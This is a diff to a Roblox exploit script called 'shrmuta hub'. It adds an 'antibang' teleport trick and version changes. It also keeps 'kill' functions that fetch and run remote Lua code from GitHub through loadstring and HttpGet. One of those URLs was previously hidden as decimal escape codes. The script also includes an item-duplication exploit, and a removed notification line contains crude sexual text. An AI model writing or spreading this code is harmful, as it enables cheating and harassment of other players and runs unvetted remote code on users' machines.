@@ -35,10 +35,13 @@ game.StarterGui:SetCore("SendNotification",{
 wait(5)
 game.StarterGui:SetCore("SendNotification",{
     Title = "good new's";
-    Text = "new fe script : Fe pp with cum"
+    Text = "new antibang in misc"
 })
-
-
+wait(2)
+game.StarterGui:SetCore("SendNotification",{
+    Title = "announcements";
+    Text = "most of the script will not work we will fix that very soon"
+})
 _G.dont = false
 local UI = GUI:CreateWindow("shrmuta hub","UI made by dream0_7")
 _G.anticheat = true
@@ -49,7 +52,9 @@ local fescripts = UI:addPage("Fe Script's",4,false,10)
 TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local radio = "\216\167\217\132\216\167\216\186\216\167\217\134\217\138 \217\133\216\179\216\172\217\132"
-local version = "2.2.7"
+local version = "3.0.0"
+_G.killv1 = false
+_G.killv2 = false
 print("version of the script is "..version)
 function Dupe(amount)
     local DropT = {}
@@ -102,6 +107,34 @@ function Dupe(amount)
     ungrabtools()
 wait(.3)
 end    
+
+function antibang()
+    _G.ay = true
+    local baseplate = Instance.new("Part")
+    baseplate.Parent = workspace
+    baseplate.Size = Vector3.new(30,1,30)
+    baseplate.Anchored = true
+    baseplate.Name = "Baseplate55"
+    baseplate.Position = Vector3.new(0, -507.5284729003906, 0)
+    killv2()  
+    wait(0.2)
+    while _G.ay == true do
+    local Pos = speaker.Character.HumanoidRootPart.CFrame
+    speaker.Character.HumanoidRootPart.CFrame = CFrame.new(0, -504.5284729003906, 0)
+    wait(0.3)
+    speaker.Character.HumanoidRootPart.CFrame = Pos
+    wait(7)
+    end
+    
+end
+
+function unantibang()
+    _G.ay = false
+    wait(1)
+    for i,v in pairs(game:GetDescendants()) do
+        if v.Name == "Baseplate55" then v:Destroy() end
+    end
+end
 
 function getRoot(char)
     local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
@@ -600,15 +633,21 @@ end)
 
 spawn(function ()
     function killv1()
+    if _G.killv1 == false then
      loadstring(game:HttpGet('https://raw.githubusercontent.com/klat3mk/remake/main/fe%20kill%20for%20any%20game'))()
+    _G.killv1 = true
     end
+end
 end)
 
 
 spawn(function ()
     function killv2()
-     loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\79\109\110\105\112\111\116\101\110\99\101\68\101\118\101\108\111\112\101\114\47\78\117\109\98\101\114\47\109\97\105\110\47\49\46\108\117\97'))()
-     end
+        if _G.killv2 == false then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hexx/main/Iv%20Admin/Admin%202.lua'))()
+        _G.killv2 = true
+        end
+    end
 end)
 
 
@@ -2335,7 +2374,7 @@ local misc = UI:addPage("misc",1,false,6)
 
 -- [ misc ] --
 
-misc:addLabel("good new's","Dupe is now FIXED")
+misc:addLabel("good new's","new misc script : antibang")
 
 misc:addTextBox("Dupe","do 5",function(amount)
     game.StarterGui:SetCore("SendNotification",{
@@ -2345,7 +2384,21 @@ misc:addTextBox("Dupe","do 5",function(amount)
     Dupe(amount)
 end)
 
-
+misc:addToggle("antibang",function(value)
+    if value == true then 
+        game.StarterGui:SetCore("SendNotification",{
+            Title = "Note";
+            Text = "antibang is active!";
+        })
+        antibang()
+    else 
+        game.StarterGui:SetCore("SendNotification",{
+            Title = "Note";
+            Text = "antibang has stopped..";
+        })
+        unantibang()
+    end
+end)
 
 misc:addToggle("grabtools!",function(value)
     if value == true then 
